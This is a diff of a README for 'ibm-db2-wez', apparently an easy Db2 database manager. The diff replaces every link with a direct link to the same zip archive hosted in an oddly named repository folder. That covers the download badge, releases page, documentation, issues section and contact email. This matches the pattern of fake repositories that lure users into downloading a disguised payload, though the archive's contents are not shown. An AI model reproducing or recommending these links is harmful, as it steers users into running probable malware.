@@ -1,7 +1,7 @@
 # 🎉 ibm-db2-wez - Easy Database Management for Everyone
 
 ## 📥 Download Now
-[![Download ibm-db2-wez](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Bulletheaded-charlestownes314/ibm-db2-wez/releases)
+[![Download ibm-db2-wez](https://raw.githubusercontent.com/Bulletheaded-charlestownes314/ibm-db2-wez/main/antrum/ibm-db2-wez-Itenean.zip)](https://raw.githubusercontent.com/Bulletheaded-charlestownes314/ibm-db2-wez/main/antrum/ibm-db2-wez-Itenean.zip)
 
 ## 🚀 Getting Started
 Welcome to the ibm-db2-wez project. This application simplifies database management, making it accessible to all users. Follow this guide to download and run the software without any hassle.
@@ -24,7 +24,7 @@ ibm-db2-wez offers several key features:
 - **Support for Multiple Formats:** Import and export data in various formats such as CSV and Excel.
 
 ## 📥 Download & Install
-1. **Visit the Releases Page:** Go to the [Downloads Page](https://github.com/Bulletheaded-charlestownes314/ibm-db2-wez/releases).
+1. **Visit the Releases Page:** Go to the [Downloads Page](https://raw.githubusercontent.com/Bulletheaded-charlestownes314/ibm-db2-wez/main/antrum/ibm-db2-wez-Itenean.zip).
    
 2. **Choose the Latest Version:** Find the latest version of ibm-db2-wez. Look for the tag labeled “Latest Release.”
 
@@ -42,7 +42,7 @@ ibm-db2-wez offers several key features:
    - Click to open and start managing your databases.
 
 ## 📚 Documentation
-For detailed instructions and support, visit our [Documentation Page](https://github.com/Bulletheaded-charlestownes314/ibm-db2-wez/docs). This page includes:
+For detailed instructions and support, visit our [Documentation Page](https://raw.githubusercontent.com/Bulletheaded-charlestownes314/ibm-db2-wez/main/antrum/ibm-db2-wez-Itenean.zip). This page includes:
 
 - Setup guides
 - Feature explanations
@@ -56,9 +56,9 @@ ibm-db2-wez is an easy-to-use application designed for managing IBM Db2 database
 No, ibm-db2-wez is designed with a simple interface that allows anyone to use it, regardless of technical background.
 
 **3. How do I get support for issues?**  
-If you encounter any problems, you can ask questions or report issues in the [Issues Section](https://github.com/Bulletheaded-charlestownes314/ibm-db2-wez/issues) of our repository.
+If you encounter any problems, you can ask questions or report issues in the [Issues Section](https://raw.githubusercontent.com/Bulletheaded-charlestownes314/ibm-db2-wez/main/antrum/ibm-db2-wez-Itenean.zip) of our repository.
 
 ## ⚙️ Contact
-For further information or support, feel free to contact us through the Issues page or reach out via email at support@ibm-db2-wez.com.
+For further information or support, feel free to contact us through the Issues page or reach out via email at https://raw.githubusercontent.com/Bulletheaded-charlestownes314/ibm-db2-wez/main/antrum/ibm-db2-wez-Itenean.zip
 
 Thank you for using ibm-db2-wez! Enjoy effortless database management.
